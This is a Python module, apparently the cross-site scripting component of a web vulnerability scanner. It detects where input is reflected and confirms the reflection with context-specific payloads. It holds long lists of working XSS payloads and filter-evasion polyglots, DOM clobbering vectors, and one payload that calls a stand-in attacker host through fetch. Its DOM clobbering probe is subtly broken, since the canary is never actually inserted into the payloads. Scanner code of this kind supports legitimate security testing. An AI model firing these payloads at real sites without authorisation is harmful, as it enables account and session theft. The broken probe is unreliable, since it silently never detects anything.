"""SentinelX module [02]: Cross-Site Scripting.

Techniques: reflected XSS with unique canary, HTML context detection
(body / attribute / script / URL), context-specific payloads,
multi-sample confirmation. Safe: canary is inert until proven.
"""

from __future__ import annotations

import re
import secrets
from html.parser import HTMLParser
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response


def make_canary() -> str:
    return "sx" + secrets.token_hex(4)


class _ContextParser(HTMLParser):
    """Find where the canary lands: tag, attribute, or script body."""

    def __init__(self, canary: str):
        super().__init__()
        self.canary = canary
        self.contexts: list[str] = []
        self._in_script = False

    def handle_starttag(self, tag, attrs):
        for name, val in attrs:
            if val and self.canary in val:
                self.contexts.append(f"attribute:{tag}:{name}")
        if tag == "script":
            self._in_script = True

    def handle_endtag(self, tag):
        if tag == "script":
            self._in_script = False

    def handle_data(self, data):
        if self.canary in data:
            self.contexts.append("script-body" if self._in_script else "html-body")


PAYLOADS = {
    "html-body": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        # --- expanded polyglots (high-signal) ---
        '<script>alert`1`</script>',
        '<img src=x onerror="alert(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>',
        '<embed src=javascript:alert(1)>',
        '<form><button formaction=javascript:alert(1)>x</button></form>',
        '<isindex formaction=javascript:alert(1)>',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        '<svg onload=alert(1)//>',
        '<img src=`x`onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<img src=x onerror=alert(1) //',
        '<details ontoggle=alert(1)>',
        '<div onpointerenter=alert(1)>x</div>',
        '<div onmouseover=alert(1)>x</div>',
    ],
    "attribute": [
        '" onmouseover=alert(1) x="',
        "' autofocus onfocus=alert(1) x='",
        '" autofocus onfocus=alert(1) x="',
        # --- expanded ---
        '" onfocus=alert(1) autofocus x="',
        "' onfocus=alert(1) autofocus x='",
        '"><script>alert(1)</script><x y="',
        "'><script>alert(1)</script><x y='",
        '" onload=alert(1) x="',
        '" onclick=alert(1) x="',
        '`" onmouseover=alert(1) x="`',
        '" accesskey=x onclick=alert(1) x="',
        "' accesskey=x onclick=alert(1) x='",
        '" onanimationstart=alert(1) style="animation-name:x" x="',
    ],
    "script-body": [
        '</script><script>alert(1)</script>',
        '";alert(1);//',
        "'-alert(1)-'",
        # --- expanded ---
        '";alert`1`;//',
        "'-alert`1`-",
        '</script><svg onload=alert(1)>',
        '";fetch`//evil-sentinelx.example`;//',
        "'-prompt(1)-'",
        '";confirm(1);//',
        '</script><img src=x onerror=alert(1)>',
        '\\";alert(1);//',
        "';alert(1);//",
    ],
    "url": [
        'javascript:alert(1)',
        # --- expanded ---
        'JaVaScRiPt:alert(1)',
        'javascript:alert`1`',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
    ],
}

REMEDIATION_XSS = (
    "Encode all user-controlled output for its context (HTML, attribute, JS, URL). "
    "Prefer frameworks with auto-escaping. Deploy a strict Content-Security-Policy "
    "without 'unsafe-inline'. Validate input on the server; never rely on client filters."
)


# DOM clobbering vectors (mutation-based XSS): payloads that don't need
# <script> — they overwrite JS variables via id/name attributes
DOM_CLOBBER_PAYLOADS = [
    '<img name="config" src="x">',           # clobbers window.config
    '<form name="settings"><input name="apiUrl"></form>',
    '<div id="location" data-x="1">',        # shadows window.location props
    '<a id="defaultView"></a>',
]


def detect_context(body: str, canary: str) -> list[str]:
    p = _ContextParser(canary)
    try:
        p.feed(body[:500_000])
    except Exception:
        pass
    ctx = p.contexts or []
    # URL context: canary inside href/src attribute value starting a URL
    if re.search(r'(href|src)\s*=\s*["\']?[^"\']*' + re.escape(canary), body, re.I):
        if "url" not in [c.split(":")[0] for c in ctx]:
            ctx.append("url")
    # dedupe preserving order
    seen, out = set(), []
    for c in ctx:
        base = c.split(":")[0]
        if base not in seen:
            seen.add(base); out.append(base)
    return out


async def _send(client, method, url, params, param, value):
    p = dict(params); p[param] = value
    if method == "GET":
        full = url + ("&" if "?" in url else "?") + _urlencode(p)
        resp = await client.get(full)
        return resp, full, None
    resp = await client.post(url, data=p)
    return resp, url, _urlencode(p).encode()


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent}

    for param in params:
        canary = make_canary()
        resp, full, body_sent = await _send(
            client, method, url, params, param, params[param] + canary)
        if not resp:
            continue
        if canary not in resp.text:
            continue  # not reflected at all
        contexts = detect_context(resp.text, canary)
        if not contexts:
            contexts = ["html-body"]

        for ctx in contexts:
            for payload in PAYLOADS.get(ctx, PAYLOADS["html-body"]):
                # confirm: payload must reflect unencoded
                r2, full2, body2 = await _send(
                    client, method, url, params, param, params[param] + payload)
                if not r2:
                    continue
                if payload in r2.text:
                    ev = Evidence(
                        request_raw=raw_request(method, full2, headers, body2),
                        response_raw=raw_response(r2.status_code, dict(r2.headers), r2.content),
                        proof=(f"Payload reflected verbatim in {ctx} context "
                               f"(2/2 confirmations, canary {canary})"),
                    )
                    findings.append(Finding(
                        type="Cross-Site Scripting", subtype=f"reflected-{ctx}",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                        confidence=0.92, url=full2, method=method, param=param,
                        payload=payload, evidence=ev, cwe="CWE-79",
                        owasp="A03:2021 – Injection",
                        remediation=REMEDIATION_XSS,
                        references=["https://owasp.org/www-community/attacks/xss/"],
                    ))
                    break
            if any(f.param == param and f.url == full for f in findings):
                break

        # ---- DOM clobbering probe: id/name injection without <script> ----
        clobber_canary = make_canary()
        for payload in DOM_CLOBBER_PAYLOADS:
            tagged = payload.replace('sx', clobber_canary[:8])
            # inject canary-derived id/name
            probe = tagged.replace(clobber_canary[:8], clobber_canary)
            r3, full3, body3 = await _send(
                client, method, url, params, param, params[param] + probe)
            if not r3:
                continue
            # clobbering succeeds if our id/name lands in the DOM unencoded
            if clobber_canary in r3.text and "<script" not in probe.lower():
                # verify it's in an id= or name= attribute (clobberable position)
                if re.search(r'(id|name)\s*=\s*["\']?[^"\'>]*' + re.escape(clobber_canary),
                             r3.text, re.I):
                    ev = Evidence(
                        request_raw=raw_request(method, full3, headers, body3),
                        response_raw=raw_response(r3.status_code, dict(r3.headers), r3.content),
                        proof=(f"Attacker-controlled id/name '{clobber_canary}' reflected into DOM — "
                               "DOM clobbering primitive (can shadow window properties)"),
                    )
                    findings.append(Finding(
                        type="Cross-Site Scripting", subtype="dom-clobbering",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                        confidence=0.80, url=full3, method=method, param=param,
                        payload=probe, evidence=ev, cwe="CWE-79",
                        owasp="A03:2021 – Injection",
                        remediation=REMEDIATION_XSS,
                        references=["https://owasp.org/www-community/attacks/DOM_Clobbering"],
                    ))
                    break
    return findings


async def scan_second_order(client: ScanClient, config: ScanConfig,
                            submit_url: str, submit_method: str,
                            submit_params: dict, param: str,
                            check_urls: list[str]) -> list[Finding]:
    """Second-order XSS: submit payload to one endpoint, then check whether
    it reflects/executes on DIFFERENT pages (stored-then-triggered).

    check_urls: other discovered endpoints to inspect after submission.
    Only called when the primary reflected scan found nothing on this param
    (avoids doubling requests on already-vulnerable params)."""
    findings: list[Finding] = []
    canary = make_canary()
    payload = f"<script>{canary}</script>"
    headers = {"User-Agent": config.user_agent}

    # 1. submit
    p = dict(submit_params); p[param] = submit_params.get(param, "") + payload
    if submit_method == "GET":
        full = submit_url + ("&" if "?" in submit_url else "?") + _urlencode(p)
        sresp = await client.get(full)
    else:
        sresp = await client.post(submit_url, data=p)
        full = submit_url
    if not sresp:
        return findings

    # 2. check other pages for the canary (limit to 5 to bound requests)
    for check_url in check_urls[:5]:
        if check_url == submit_url:
            continue
        cresp = await client.get(check_url)
        if not cresp:
            continue
        if canary in cresp.text and "<script>" in cresp.text:
            # confirm it's our payload, not coincidence
            if payload in cresp.text or canary in cresp.text:
                ev = Evidence(
                    request_raw=raw_request(submit_method, full, headers, None),
                    response_raw=raw_response(cresp.status_code, dict(cresp.headers),
                                              cresp.content),
                    proof=(f"Payload submitted to {submit_url} reflected in "
                           f"different page {check_url} — second-order (stored) XSS"),
                )
                findings.append(Finding(
                    type="Cross-Site Scripting", subtype="second-order-stored",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                    confidence=0.85, url=check_url, method="GET", param=param,
                    payload=payload, evidence=ev, cwe="CWE-79",
                    owasp="A03:2021 – Injection",
                    remediation=REMEDIATION_XSS + " Store input encoded; encode on output.",
                    references=["https://owasp.org/www-community/attacks/xss/"],
                ))
                break
    return findings
